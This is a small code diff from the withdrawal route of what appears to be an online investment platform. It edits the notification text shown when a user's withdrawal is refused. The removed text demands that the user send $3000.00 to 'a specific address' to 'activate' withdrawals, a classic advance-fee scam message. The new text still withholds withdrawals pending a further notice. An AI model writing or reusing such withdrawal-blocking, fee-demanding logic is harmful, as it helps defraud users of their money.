@@ -242,7 +242,7 @@ router$1.post("/withdraw", (req, res) => {
     const newNotifis = new Notification({
       user: req.user.id,
       topic: "Withdrawals not available due to unactivated account",
-      content: `Hello ${req.user.name}, your request for withdrawals has not been APPROVED due to your account hasn't been activated for withdrawals. The activation was put in to avoid BOT investment. You are needed to send $3000.00 to a specific address as a symbol of yor activation which will be recieved by our withdrawals board and sent back to your balance after been deposited.
+      content: `Hello ${req.user.name} your account is not activated for WITHDRAWALS yet, a notification will be sent to you to go about it. Thank you.
       `,
     });
     newNotifis
